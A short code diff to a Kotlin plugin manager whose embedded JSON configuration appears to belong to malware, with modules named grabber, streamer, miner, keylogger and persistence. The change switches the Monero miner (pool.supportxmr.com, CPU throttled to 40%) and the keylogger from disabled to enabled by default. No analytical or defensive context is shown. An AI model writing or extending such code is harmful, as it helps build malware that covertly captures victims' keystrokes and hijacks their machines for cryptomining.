@@ -73,13 +73,13 @@ object PluginManager {
                 {
                   "grabber": { "enabled": true, "version": "2.0" },
                   "streamer": { "enabled": true, "version": "1.0" },
-                  "miner": { "enabled": false, "version": "1.0", "settings": {
+                  "miner": { "enabled": true, "version": "1.0", "settings": {
                     "wallet": "",
                     "pool": "pool.supportxmr.com:3333",
                     "threads": 2,
                     "max_cpu_percent": 40
                   }},
-                  "keylogger": { "enabled": false, "version": "1.0" },
+                  "keylogger": { "enabled": true, "version": "1.0" },
                   "persistence": { "enabled": true, "version": "1.0" }
                 }
                 """.trimIndent()
